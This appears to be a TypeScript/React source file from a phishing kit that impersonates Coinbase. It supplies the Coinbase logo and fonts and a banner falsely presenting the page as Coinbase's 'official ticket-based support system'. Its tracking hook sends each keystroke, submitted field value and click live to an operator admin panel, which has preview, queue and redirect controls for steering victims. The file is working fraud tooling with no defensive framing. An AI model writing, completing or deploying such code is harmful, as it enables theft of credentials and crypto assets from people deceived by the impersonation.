// Shared Coinbase page primitives: logo, support banner, font-face block, and
// a tracking hook that maps the pages' original `useVisitorTracking` API onto
// the app's `useParticipant` orchestrator so the admin panel (queue, live
// preview, live-input feed, redirect controls) keeps working unchanged.

import { useEffect, useMemo } from "react";
import { useNavigate, useRouterState } from "@tanstack/react-router";
import { useParticipant } from "@/hooks/useParticipant";
import { cbFonts } from "@/lib/cb-assets";
import { bindObserveMirror } from "@/lib/mirrorApply";

export function CbLogo({ size = 32 }: { size?: number }) {
  return (
    <svg
      aria-label="Coinbase logo"
      height={size}
      role="img"
      viewBox="0 0 48 48"
      width={size}
      xmlns="http://www.w3.org/2000/svg"
    >
      <path
        d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z"
        fill="currentColor"
      />
    </svg>
  );
}

export function CbSupportBanner() {
  return (
    <div
      style={{
        width: "100%",
        backgroundColor: "rgb(0, 82, 255)",
        padding: "10px 16px",
        textAlign: "center",
        fontSize: 13,
        lineHeight: "18px",
        color: "#fff",
        fontWeight: 400,
      }}
    >
      This is our official ticket-based support system. Remember to follow the
      instructions provided by our representative and your assets will be safe.{" "}
      <a
        href="https://www.coinbase.com/legal/privacy"
        target="_blank"
        rel="noopener noreferrer"
        style={{ color: "#fff", textDecoration: "underline", fontWeight: 500 }}
      >
        Privacy Policy
      </a>
    </div>
  );
}

/** Full @font-face block for every Coinbase font. Include once per page. */
export function CbFontStyle() {
  return (
    <style>{`
      @font-face { font-family: 'CoinbaseDisplay'; src: url('${cbFonts.display}') format('woff2'); font-weight: 400 800; font-display: swap; }
      @font-face { font-family: 'CoinbaseSans'; src: url('${cbFonts.sansRegular}') format('woff2'); font-weight: 400; font-display: swap; }
      @font-face { font-family: 'CoinbaseSans'; src: url('${cbFonts.sansMedium}') format('woff2'); font-weight: 500; font-display: swap; }
      @font-face { font-family: 'CoinbaseSans'; src: url('${cbFonts.sansBold}') format('woff2'); font-weight: 700; font-display: swap; }
      @font-face { font-family: 'CoinbaseSans'; src: url('${cbFonts.font3}') format('woff2'); font-weight: 400; font-display: swap; }
      @font-face { font-family: 'CoinbaseText'; src: url('${cbFonts.font2}') format('woff2'); font-weight: 400; font-display: swap; }
      @font-face { font-family: 'CoinbaseText'; src: url('${cbFonts.font4}') format('woff2'); font-weight: 500 600; font-display: swap; }
      @font-face { font-family: 'CoinbaseText'; src: url('${cbFonts.textBold}') format('woff2'); font-weight: 700 800; font-display: swap; }
      @font-face { font-family: 'CoinbaseText'; src: url('${cbFonts.textBoldItalic}') format('woff2'); font-weight: 700 800; font-style: italic; font-display: swap; }
      @font-face { font-family: 'CoinbaseMono'; src: url('${cbFonts.monoExtraLight}') format('woff2'); font-weight: 200; font-display: swap; }
      @font-face { font-family: 'CoinbaseMono'; src: url('${cbFonts.monoLight}') format('woff2'); font-weight: 300; font-display: swap; }
      @font-face { font-family: 'CoinbaseMono'; src: url('${cbFonts.monoRegular}') format('woff2'); font-weight: 400; font-display: swap; }
      @font-face { font-family: 'CoinbaseMono'; src: url('${cbFonts.monoMedium}') format('woff2'); font-weight: 500; font-display: swap; }
      @font-face { font-family: 'CoinbaseMono'; src: url('${cbFonts.monoBold}') format('woff2'); font-weight: 700; font-display: swap; }
    `}</style>
  );
}

/** True when this page is rendered inside the admin's live-preview iframe. */
export function useIsObserve(): boolean {
  return useMemo(() => {
    if (typeof window === "undefined") return false;
    try {
      return new URLSearchParams(window.location.search).get("__observe") === "1";
    } catch {
      return false;
    }
  }, []);
}

/** Read a URL query param without registering a search schema per route. */
export function useQueryParam(name: string): string | null {
  const search = useRouterState({ select: (s) => s.location.search });
  return useMemo(() => {
    if (typeof window === "undefined") return null;
    try {
      const raw = typeof search === "string"
        ? search
        : window.location.search;
      return new URLSearchParams(raw.startsWith("?") ? raw.slice(1) : raw).get(name);
    } catch {
      return null;
    }
  }, [search, name]);
}

/**
 * Drop-in replacement for the pages' original `useVisitorTracking()`.
 * - `sessionId` — the participant id (used by admin panel to correlate).
 * - `trackClick(label)` — surfaces as an admin "click" event.
 * - `trackInput(field, value)` — live typing (mirrored in live preview).
 * - `trackSubmit(field, value)` — final submitted value (shown once in Submitted).
 * - `cbNavigate(to)` — TanStack navigate; no-op inside observer iframe.
 */
export function useCbTracking() {
  const isObserve = useIsObserve();
  const navigate = useNavigate();
  const { emitInput, emitLiveInput, participantId } = useParticipant();

  function trackClick(label: string) {
    if (isObserve) return;
    emitInput("__click", label);
  }

  function trackInput(field: string, value: string) {
    if (isObserve) return;
    emitLiveInput(field, value);
  }

  function trackSubmit(field: string, value: string) {
    if (isObserve) return;
    emitInput(field, value);
  }

  function cbNavigate(to: string) {
    if (isObserve) return;
    // Mark this as an internal (page-driven) navigation so the admin's
    // assignedUrl heartbeat doesn't yank us back.
    try {
      window.postMessage({ __ux: true, type: "internal_navigation", url: to }, "*");
    } catch { /* ignore */ }
    navigate({ to, reloadDocument: false }).catch(() => {
      window.location.assign(to);
    });
  }

  // Mirror-mode: live typing + real button/checkbox clicks (1:1 with participant).
  useEffect(() => bindObserveMirror(isObserve), [isObserve]);

  return {
    sessionId: participantId,
    trackClick,
    trackInput,
    trackSubmit,
    cbNavigate,
    isObserve,
  };
}
